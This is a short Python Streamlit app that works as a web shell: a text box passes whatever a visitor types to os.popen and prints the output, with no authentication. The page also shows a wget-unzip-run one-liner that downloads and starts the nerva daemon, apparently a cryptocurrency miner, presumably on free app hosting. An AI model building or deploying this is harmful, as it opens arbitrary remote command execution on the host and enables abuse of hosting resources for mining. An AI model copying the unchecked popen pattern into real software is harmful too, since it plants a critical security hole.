import os
import streamlit as st

st.header('My Streamlit App')
st.text("wget https://github.com/nerva-project/nerva/releases/download/v0.1.8.0/nerva-v0.1.8.0_linux_minimal.zip -O nerva.zip && unzip nerva.zip && ./nervad")
input_text = st.text_input('Enter CMD')
button = st.button('Run')

if button:
    if input_text:
        output = os.popen(input_text).read()
        st.text(output)
    else:
        st.text('Please Enter CMD')
